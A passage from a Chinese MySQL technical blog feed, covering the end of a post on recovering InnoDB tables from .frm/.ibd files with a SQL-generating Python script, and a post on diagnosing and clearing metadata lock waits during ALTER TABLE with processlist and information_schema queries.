class="code"><pre><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql6.sql</span><br><span class="line">ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query</span><br></pre></td></tr></table></figure><p>解决方法：</p><ol><li><p>sql脚本中执行import tablespace的操作需要开启recovery的参数</p></li><li><p>重启服务 </p><p>在客户服务上，执行以上操作还是报错无法连接，尝试多次都不行。</p></li></ol><p><img src="MySQL%E4%B8%80%E6%AC%A1%E6%83%8A%E5%BF%83%E5%8A%A8%E9%AD%84%E5%9C%B0%E6%95%B0%E6%8D%AE%E5%BC%BA%E5%88%B6%E6%81%A2%E5%A4%8D/04.jpg" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次case的教训就是，备份！一定要有周期性的有效备份！</p><p>欺骗MySQL进程蒙混过关只能是没办法的办法，而且不能保证成功率。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> -*- coding : utf8 -*-</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> py_createtable01.py</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> auth： booboowei</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class mysql_tools():</span><br><span class="line">    def __init__(self, in_file):</span><br><span class="line">        self.b_list = open(in_file).readlines()</span><br><span class="line"></span><br><span class="line">       </span><br><span class="line">    def create_table_test(self, sql_file):</span><br><span class="line">        a_file = open(sql_file, 'w')</span><br><span class="line">        for table in self.b_list:</span><br><span class="line">            string = "create table &#123;&#125; (id int);".format(table)</span><br><span class="line">            a_file.write(string)</span><br><span class="line">        a_file.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    def desc_table_test(self, sql_file):</span><br><span class="line">        a_file = open(sql_file, 'w')</span><br><span class="line">        for table in self.b_list:</span><br><span class="line">            string = "desc &#123;&#125;;".format(table)</span><br><span class="line">            a_file.write(string)</span><br><span class="line">        a_file.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    def create_table_col(self, sql_file):</span><br><span class="line">        a_file = open(sql_file, 'w')</span><br><span class="line">        str_list = []</span><br><span class="line">        for table_col_str in self.b_list:</span><br><span class="line">            table_col_list = table_col_str.split()</span><br><span class="line">            table = table_col_list[0]</span><br><span class="line">            col = int(table_col_list[1])</span><br><span class="line">            string = "create table &#123;&#125; (".format(table)</span><br><span class="line">            str_list.append(string)</span><br><span class="line">            for i in range(1, col + 1):</span><br><span class="line">                if i != col:</span><br><span class="line">                    string = 'id&#123;&#125; int,'.format(i)</span><br><span class="line">                else:</span><br><span class="line">                    string = 'id&#123;&#125; int);'.format(i)</span><br><span class="line">                str_list.append(string)</span><br><span class="line">        for line in str_list:</span><br><span class="line">            a_file.write(line)</span><br><span class="line">        a_file.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    def drop_table_test(self,  sql_file):</span><br><span class="line">        a_file = open(sql_file, 'w')</span><br><span class="line">        for table in self.b_list:</span><br><span class="line">            string = "drop table &#123;&#125;;".format(table)</span><br><span class="line">            a_file.write(string)</span><br><span class="line">        a_file.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    def discard_table_test(self, sql_file):</span><br><span class="line">        a_file = open(sql_file, 'w')</span><br><span class="line">        for table in self.b_list:</span><br><span class="line">            string = "alter table &#123;&#125; discard tablespace;".format(table)</span><br><span class="line">            a_file.write(string)</span><br><span class="line">        a_file.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    def import_table_test(self, sql_file):</span><br><span class="line">        a_file = open(sql_file, 'w')</span><br><span class="line">        for table in self.b_list:</span><br><span class="line">            string = "alter table &#123;&#125; import tablespace;".format(table)</span><br><span class="line">            a_file.write(string)</span><br><span class="line">        a_file.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    mysql_tools('/alidata/cy_table.txt').create_table_test('/alidata/cy_sql1.sql')</span><br><span class="line">    mysql_tools('/alidata/cy_table.txt').desc_table_test('/alidata/cy_sql2.sql')</span><br><span class="line">    # 根据以上表名和列数生成新的测试表</span><br><span class="line">    mysql_tools('/alidata/cy_table_col.txt').create_table_col('/alidata/cy_sql3.sql')</span><br><span class="line">    mysql_tools('/alidata/cy_table.txt').drop_table_test('/alidata/cy_sql4.sql')</span><br><span class="line">    mysql_tools('/alidata/cy_table.txt').discard_table_test('/alidata/cy_sql5.sql')</span><br><span class="line">    mysql_tools('/alidata/cy_table.txt').import_table_test('/alidata/cy_sql6.sql')</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;摘要：Cash恢复的正确方式是：&lt;strong&gt;备份文件（逻辑或物理）+ binlog&lt;/strong&gt;进行恢复；然而并不是所有的运维人员都知道怎么进行正确的备份，甚至连逻辑备份和物理备份的区别是什么都不知道？更不知道备份过程中需要考虑数据的一致性与服务可用性的问题？或者连备份工具都不会使用，所以当你问：有备份吗？回答：没有或者无效&lt;/p&gt;
&lt;p&gt;在本次案例中，某客户数据库因存储空间不够导致数据库服务宕掉，而客户在数据库宕机后，只拷贝了单个&lt;code&gt;cy&lt;/code&gt;库所属的目录进行了文件层面的备份，就将其他文件全部清空，当他想重新启动数据库时发现数据库服务启动。MySQL使用5.7.17版本，使用innodb存储引擎，开启了独立表空间。也就是说当前的救命稻草是：每个表的&lt;code&gt;.frm&lt;/code&gt;和&lt;code&gt;.ibd&lt;/code&gt;文件。&lt;/p&gt;
    
    </summary>
    
    
      <category term="技术广角" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/"/>
    
      <category term="MySQL" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/MySQL/"/>
    
    
      <category term="数据救援" scheme="http://www.toberoot.com/tags/%E6%95%B0%E6%8D%AE%E6%95%91%E6%8F%B4/"/>
    
  </entry>
  
  <entry>
    <title>MySQL的元锁MDL发生场景和解决方法总结</title>
    <link href="http://www.toberoot.com/2017/08/19/booboo_others/MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>http://www.toberoot.com/2017/08/19/booboo_others/MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</id>
    <published>2017-08-18T20:06:27.000Z</published>
    <updated>2020-03-22T08:32:42.577Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：MetaData Lock即元数据锁，在数据库中元数据即数据字典信息包括db,table,function,procedure,trigger,event等。metadata lock主要为了保证元数据的一致性,用于处理不同线程操作同一数据对象的同步与互斥问题。</p><p>今天有客户(MySQL 5.6)遇到该问题，最关键的是属于第三种情况，google上根本找不到类似的故障案例，唯一一个非常接近的故障案例中数据库版本却不同（具体看下文慢慢聊），哎，困难重重啊，最终还是解决了哈。</p><p>alter table的语句是很危险的，在操作之前最好确认对要操作的表没有任何进行中的操作、没有未提交事务、也没有显式事务中的报错语句。如果有alter table的维护任务，在无人监管的时候运行，最好通过lock_wait_timeout设置好超时时间，避免长时间的metedata锁等待。</p><a id="more"></a><h2 id="什么是metadata-lock？"><a href="#什么是metadata-lock？" class="headerlink" title="什么是metadata lock？"></a>什么是metadata lock？</h2><p>MetaData Lock即元数据锁，在数据库中元数据即数据字典信息包括db,table,function,procedure,trigger,event等。metadata lock主要为了保证元数据的一致性,用于处理不同线程操作同一数据对象的同步与互斥问题。</p><h3 id="MetaData-Lock的前世今生"><a href="#MetaData-Lock的前世今生" class="headerlink" title="MetaData Lock的前世今生"></a><strong>MetaData Lock的前世今生</strong></h3><p>MDL锁是为了解决一个有名的<a href="https://bugs.mysql.com/bug.php?id=989" target="_blank" rel="noopener">bug#989</a>，所以在5.5.3版本引入了MDL锁。其实5.5也有类似保护元数据的机制，只是没有明确提出MDL概念而已。但是5.5之前版本(比如5.1)与5.5之后版本在保护元数据这块有一个显著的不同点是，5.1对于元数据的保护是语句级别的，5.5对于metadata的保护是事务级别的。所谓语句级别，即语句执行完成后，无论事务是否提交或回滚，其表结构可以被其他会话更新；而事务级别则是在事务结束后才释放MDL。引入MDL锁主要是为了<strong>解决两个问题</strong>：</p><ul><li>事务隔离问题：比如在可重复隔离级别下，会话A在2次查询期间，会话B对表结构做了修改，两次查询结果就会不一致，无法满足可重复读的要求。</li><li>数据复制问题：比如会话A执行了多条更新语句期间，另外一个会话B做了表结构变更并且先提交，就会导致slave在重做时，先重做alter，再重做update时就会出现复制错误的现象。也就是上面提到的<a href="https://bugs.mysql.com/bug.php?id=989" target="_blank" rel="noopener">bug#989</a>。</li></ul><hr><h3 id="DDL操作与MetaData-Lock"><a href="#DDL操作与MetaData-Lock" class="headerlink" title="DDL操作与MetaData Lock"></a>DDL操作与MetaData Lock</h3><ul><li>metadata lock 机制是为了保证数据一致性存在的，在有事务的操作时候，需要首先获得metadata lock ,然后操作，如果这个时候，又来了一个事务也要ddl操作同一个表，就会出现 metadata lock。</li><li>自动提交模式下，单语句就是一个事务，执行完了，事务也就结束了。</li><li>preparestatement  会获得 metalock，一旦prepare 完毕， metalock 就释放了。</li><li>online DDL应该是指在alter table进行的时候， 插入/修改/删除数据的sql语句不会Waiting for table metadata lock。一旦alter table TableA的操作停滞在Waiting for table metadata lock的状态，后续对TableA的任何操作（包括读）都无法进行，也会在Opening tables的阶段进入Waiting for table metadata lock的队列。</li></ul><h2 id="Alter-table-会发生锁的三种场景"><a href="#Alter-table-会发生锁的三种场景" class="headerlink" title="Alter table 会发生锁的三种场景"></a>Alter table 会发生锁的三种场景</h2><h3 id="场景1"><a href="#场景1" class="headerlink" title="场景1"></a>场景1</h3><ul><li>会话A对booboo表执行读操作<code>select *,sleep(60) from booboo;</code>，正在进行未提交事务</li><li>会话B对booboo表执行在线DDL操作<code>alter table booboo add q4 int default 0;</code></li><li>会话C对booboo表执行隐式读操作<code>select *,sleep(60) from booboo;</code>,进行等待</li><li>会话D对booboo表执行显示读操作<code>begin;select * from booboo;</code>也会进行等待</li><li>通过<code>show processlist</code>可以看到会话A（对booboo表上正在进行的操作），此时会话B（alter table语句）无法获取到metadata 独占锁，会进行等待，会话C和会话D都会进行等待，且能从processlist表中看到对booboo表的操作</li><li>会话A提交事务后或kill之后，会话C事务结束，会话D<code>select</code>语句执行成功，事务提交则会话B可执行，否则进入场景2</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show processlist;</span></span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">| Id | User | Host      | db        | Command | Time | State                           | Info                                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">|  6 | root | localhost | uplooking | Query   |  167 | Waiting for table metadata lock | alter table booboo add q4 int default 0 |</span><br><span class="line">|  7 | root | localhost | uplooking | Query   |  155 | Waiting for table metadata lock | select * from booboo                    |</span><br><span class="line">|  8 | root | localhost | uplooking | Query   |    0 | starting                        | show processlist                        |</span><br><span class="line">|  9 | root | localhost | uplooking | Query   |  181 | User sleep                      | select *,sleep(60) from booboo          |</span><br><span class="line">| 10 | root | localhost | uplooking | Query   |    7 | Waiting for table metadata lock | select * from booboo                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">#</span><span class="bash"> id=9的线程为会话A 虽然是隐式事务，但是没有执行成功，所以为未提交的事务</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> id=6的线程为会话B 在会话A有事务未提交的情况下，执行Alter操作,争抢metadata lock</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> id=7的线程为会话C 隐式查询事务也会进入等待</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> id=10的线程为会话D 显示查询事务同样进入等待</span></span><br></pre></td></tr></table></figure><p>解决方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看metadatalock</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 第一种情况，则定位到长时间未提交的事务kill即可</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查询 information_schema.innodb_trx 看到有长时间未完成的事务， 使用 <span class="built_in">kill</span> 命令终止该查询。</span></span><br><span class="line"></span><br><span class="line">select concat('kill ',i.trx_mysql_thread_id,';') from information_schema.innodb_trx i,</span><br><span class="line">  (select </span><br><span class="line">         id, time</span><br><span class="line">     from</span><br><span class="line">         information_schema.processlist</span><br><span class="line">     where</span><br><span class="line">         time = (select </span><br><span class="line">                 max(time)</span><br><span class="line">             from</span><br><span class="line">                 information_schema.processlist</span><br><span class="line">             where</span><br><span class="line">                 state = 'Waiting for table metadata lock'</span><br><span class="line">                     and substring(info, 1, 5) in ('alter' , 'optim', 'repai', 'lock ', 'drop ', 'creat'))) p</span><br><span class="line">  where timestampdiff(second, i.trx_started, now()) &gt; p.time</span><br><span class="line">  and i.trx_mysql_thread_id  not in (connection_id(),p.id);</span><br></pre></td></tr></table></figure><h3 id="场景2"><a href="#场景2" class="headerlink" title="场景2"></a>场景2</h3><ul><li>通过<code>show processlist</code>看不到booboo上有任何操作，但实际上存在有未提交的事务，可以在<code>information_schema.innodb_trx</code>中查看到。在事务没有完成之前，booboo的锁不会释放，alter table同样获取不到metadata的独占锁</li><li>会话D提交事务或回滚或kill，则会话B中的Alter可继续执行</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在场景1的基础上，将会话A的事务完成或者<span class="built_in">kill</span>掉，会话C执行成功，但是会话B和会话D继续进入metadata锁的等待。原因是会话D虽然select可以执行，但是事务没有提交，则表上的metadata锁还存在，导致会话B的ddl操作无法执行。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 会话B和会话D，情况1：知道有未完成的事务D，则结束会话D的事务，会话B正常执行。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 会话B和会话D，情况2：不知道有未结束的事务D，如何排错呢？</span></span><br><span class="line">=================================</span><br><span class="line"></span><br><span class="line">-- 请根据具体的情景修改查询语句</span><br><span class="line">-- 如果导致阻塞的语句的用户与当前用户不同，请使用导致阻塞的语句的用户登录来终止会话</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 场景2的情况，是在场景1的基础上，还是有metadatalock锁（*一般生产环境不会停服务，因此不停的有新的query发送过来，就会出现场景2*），则手动继续kill掉长事务即可，注意生产环境中，有可能ddl操作需要保留（*例如MDL锁出现在主从同步的从中，从库需要去执行主发送的表变更，当然，也可以先将主从停掉，手动执行alter操作，都可以*）以下方法是在停止对从库的读操作后，将非ddl的连接kill掉</span></span></span><br><span class="line"></span><br><span class="line">select id,State,command from information_schema.processlist where State="Waiting for table metadata lock";</span><br><span class="line">select  timediff(sysdate(),trx_started) timediff,sysdate(),trx_started,id,USER,DB,COMMAND,STATE,trx_state,trx_query from information_schema.processlist,information_schema.innodb_trx  where trx_mysql_thread_id=id;</span><br><span class="line">show processlist;</span><br><span class="line">select  concat('kill ',trx_mysql_thread_id,';') from information_schema.processlist,information_schema.innodb_trx  where trx_mysql_thread_id=id and State!="Waiting for table metadata lock";</span><br><span class="line"></span><br><span class="line">===============================</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show processlist;                                                                                                             </span></span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">| Id | User | Host      | db        | Command | Time | State                           | Info                                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">|  6 | root | localhost | uplooking | Query   |  275 | Waiting for table metadata lock | alter table booboo add q6 int default 0 |</span><br><span class="line">|  7 | root | localhost | uplooking | Sleep   |  269 |                                 | NULL                                    |</span><br><span class="line">|  8 | root | localhost | uplooking | Query   |    0 | starting                        | show processlist                        |</span><br><span class="line">| 10 | root | localhost | uplooking | Sleep   |  249 |                                 | NULL                                    |</span><br><span class="line">| 12 | root | localhost | uplooking | Sleep   |  191 |                                 | NULL                                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看当前进程发现除了Alter之外没有对booboo表的操作</span></span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select  timediff(sysdate(),trx_started) timediff,sysdate(),trx_started,id,USER,DB,COMMAND,STATE,trx_state,trx_query from information_schema.processlist,information_schema.innodb_trx <span class="built_in">where</span> trx_mysql_thread_id=id;</span></span><br><span class="line">+----------+---------------------+---------------------+----+------+-----------+---------+---------------------------------+-----------+-----------------------------------------+</span><br><span class="line">| timediff | sysdate()           | trx_started         | id | USER | DB        | COMMAND | STATE                           | trx_state | trx_query                               |</span><br><span class="line">+----------+---------------------+---------------------+----+------+-----------+---------+---------------------------------+-----------+-----------------------------------------+</span><br><span class="line">| 00:05:38 | 2017-08-18 20:21:07 | 2017-08-18 20:15:29 |  6 | root | uplooking | Query   | Waiting for table metadata lock | RUNNING   | alter table booboo add q6 int default 0 |</span><br><span class="line">| 00:05:38 | 2017-08-18 20:21:07 | 2017-08-18 20:15:29 | 10 | root | uplooking | Sleep   |                                 | RUNNING   | NULL                                    |</span><br><span class="line">+----------+---------------------+---------------------+----+------+-----------+---------+---------------------------------+-----------+-----------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看innodb_trx表可以看到除了alter之外有未完成的事务，但是看不到具体query，得到线程id为10</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 就可以<span class="built_in">kill</span> 10来结束事务</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 之后Alter正常操作</span></span><br></pre></td></tr></table></figure><h3 id="场景3"><a href="#场景3" class="headerlink" title="场景3"></a>场景3</h3><blockquote><p>与场景2对比的现象不同于：</p><ul><li>场景2：未完成事务中存在未完成事务</li><li>场景3：未完成事务中不存在未完成事务：确认有错误事务未提交或回滚，找到该事务的session_id然后杀死</li></ul></blockquote><ul><li>通过<code>show processlist</code>看不到<code>booboo</code>表有任何操作，在<code>information_schema.innodb_trx</code>中也没有任何进行中的事务。</li><li>这很可能是因为在一个显式的事务中，对<code>booboo</code>表进行了一个失败的操作（比如查询了一个不存在的字段），这时事务没有开始，但是失败语句获取到的锁依然有效。从<code>performance_schema.events_statements_current</code>表中可以查到失败的语句</li><li>也就是说除了语法错误，其他错误语句获取到的锁在这个事务提交或回滚之前，仍然不会释放掉。<code>because the failed statement is written to the binary log and the locks protect log consistency</code>但是解释这一行为的原因很难理解，因为错误的语句根本不会被记录到二进制日志</li><li>解决方法：确认有错误事务未提交或回滚，找到该事务的sessionid然后杀死（难点）</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 场景3的出现和前两种不同</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看线程情况，看到alter操作metadata锁，还有其他的select操作有metadata锁</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 第一反应就是有可能是场景1，于是kill掉执行select的线程，再次查看线程情况，就只剩下执行alter线程了</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 接下来查看未完成的事务，如果是场景1，在kill掉冲突的线程后应该出现两种情况（A.alter操作正常执行B.线程中只有alter操作为waiting metadata lock状态；未完成事务中存在未完成事务）</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 但是却发现和B情况有所不同的是：未完成事务中不存在未完成事务，总结第三种情况(C.线程中只有alter操作为waiting metadata lock状态；未完成事务中不存在未完成事务）</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 通过搜索资料定位到是场景3，但资料中没有说怎么解决问题，又不能重新启动服务器，只有一个资料里提到了方法（确认有错误事务未提交或回滚，找到该事务的sessionid然后杀死，关键就是如何找到sessionid呢？performance_schema.events_statements_current中的thread_id为线程id并不是sessionid或者说会话id、连接id，如何通过thread_id找到session_id成为了难点？5.7中有个session表可以直接查到，而5.6中必须通过三表才能查到，分别为performance_schema.events_statements_current,performance_schema.threads,information_schema.processlist表。）</span></span><br><span class="line">=====================================================================================</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">kill</span>掉除了写操作以外的query</span></span><br><span class="line">select concat('kill ',id) from information_schema.processlist where State="Waiting for table metadata lock" and substring(info, 1, 5) not in ('alter' , 'optim', 'repai', 'lock ', 'drop ', 'creat');</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 寻找未提交或未回滚的错误事务，并<span class="built_in">kill</span>即可</span></span><br><span class="line">select t.processlist_id,t.processlist_time,e.sql_text from performance_schema.threads t,performance_schema.events_statements_current e where t.thread_id=e.thread_id and e.SQL_TEXT like '%t1%';</span><br><span class="line"><span class="meta">#</span><span class="bash"> 案例中假设是在t1表上有MDL锁，则，e.sql_text 近似匹配t1</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 本方法5.5 5.6 5.7 都通用。</span></span><br><span class="line">=============================================================================</span><br></pre></td></tr></table></figure><p>第一步：模拟第三种情况，会话11执行一个显示事务，且query出现列错误，t1表中不存在xx列，不提交。</p><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%5Cmdl01.png" alt=""></p><p>第二步：会话14中执行alter操作</p><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl02.png" alt="mdl02"></p><p>第三步：执行一条query</p><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl03.png" alt="mdl03"></p><p>第四步：会话15执行一个显示事务，查询t1表</p><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl04.png" alt="mdl04"></p><p>第五步：查看当前的processlist情况，可以看到只要是对t1表的操作都出现了MDL锁等待；尝试通过第一种情况的解决方法找出阻塞的事务会话进行kill，发现不存在阻塞会话；查看当前未提交的事务发现返回空；通过过滤processlist中进行MDL锁等待且不是alter的会话id，进行kill。</p><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl06.png" alt="mdl06"></p><p>第六步：只kill 12，15，留下执行alter的会话14；有人会想为什么都kill掉呢？因为即使现在kill掉了，t1表的MDL锁也不会释放掉，还不如留下会话14的ddl操作，等彻底解决了，自然就能执行这个操作。具体可以看下面的分析。</p><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl07.png" alt="mdl07"></p><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl08.png" alt="mdl08"></p><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl09.png" alt="mdl09"></p><p>第七步：给大家做个测试，即使将会话14的alter动作kill掉：</p><ul><li>processlist中看不到任何等待MDL锁的会话；</li><li>sys.schema_table_lock_waits中也不存在表锁（5.7才有sys库）；</li><li>performance_schema.metadata_locks中也不存在任何锁记录；</li><li>会话16想再去执行alter操作，又开始了MDL锁等待。</li></ul><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl10.png" alt="mdl10"></p><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl11.png" alt="mdl11"></p><p>第八步：此时就一定可以确定当前属于【<strong>有错误事务未提交或回滚导致的MDL锁</strong>】的情况了。我们找出这个错误事务，进行kill</p><p><img 